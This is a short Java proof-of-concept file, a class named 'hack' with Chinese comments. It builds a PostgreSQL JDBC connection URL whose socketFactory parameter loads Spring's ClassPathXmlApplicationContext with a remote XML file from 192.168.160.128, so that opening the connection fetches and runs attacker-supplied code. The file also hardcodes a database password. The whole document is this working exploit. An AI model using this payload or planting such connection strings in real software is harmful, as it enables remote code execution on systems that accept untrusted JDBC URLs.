import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.SQLException;
import org.springframework.context.ApplicationContext;
import org.springframework.context.support.ClassPathXmlApplicationContext;
import org.springframework.beans.factory.BeanNameAware;
import org.springframework.core.env.EnvironmentCapable;
import org.apache.commons.logging.LogFactory;
import org.springframework.expression.ParserContext;
public class hack {
    public static void main(String[] args) throws Exception {
        try {
            // 参数：
            // jdbc协议:postgresql子协议://主机地址:数据库端口号/要连接的数据库名
            //socketFactory
            //驱动程序用于创建与服务器套接字连接的类的名称。该类必须实现了接口“com.mysql.jdbc.SocketFactory”，并有公共无参量构造函数。
            String url = "jdbc:postgresql://localhost:5432/test?socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext&socketFactoryArg=http://192.168.160.128/poc.xml";
            // 数据库用户名
            String user = "postgres";
            // 数据库密码
            String password = "767yuyu8y";

            // 1. 加载Driver类，Driver类对象将自动被注册到DriverManager类中
            Class.forName("org.postgresql.Driver");

            // 2. 连接数据库，返回连接对象
            Connection conn = DriverManager.getConnection(url, user, password);
            //Connection conn = DriverManager.getConnection(
            //					"jdbc:mysql://localhost:3306/db_admin?serverTimezone=Hongkong&useUnicode=true&characterEncoding=utf8&useSSL=false",
            //					"root", "123456");
            System.out.println("数据库连接成功");
        } catch (ClassNotFoundException cnfe)
        {
            cnfe.printStackTrace();
        } catch (SQLException sqle)
        {
            sqle.printStackTrace();
        }


    }
}